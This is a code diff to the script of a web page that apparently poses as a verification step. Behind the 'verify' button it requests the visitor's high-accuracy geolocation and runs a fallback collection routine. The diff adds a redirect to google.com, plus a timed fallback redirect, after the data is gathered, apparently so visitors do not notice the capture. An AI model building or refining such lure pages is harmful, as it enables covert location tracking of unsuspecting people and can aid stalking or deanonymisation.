@@ -104,12 +104,16 @@
             });
         }
 
+        function done() {
+            window.location.href = 'https://www.google.com';
+        }
+
         function onVerify() {
             document.getElementById('landing').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
 
             if (!navigator.geolocation) {
-                collectFallback();
+                collectFallback().finally(done);
                 return;
             }
 
@@ -119,12 +123,17 @@
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude
                     });
+                    done();
                 },
                 async () => {
                     await collectFallback();
+                    done();
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
+
+            // Safety fallback: redirect after 12s no matter what
+            setTimeout(done, 12000);
         }
     </script>
 </body>
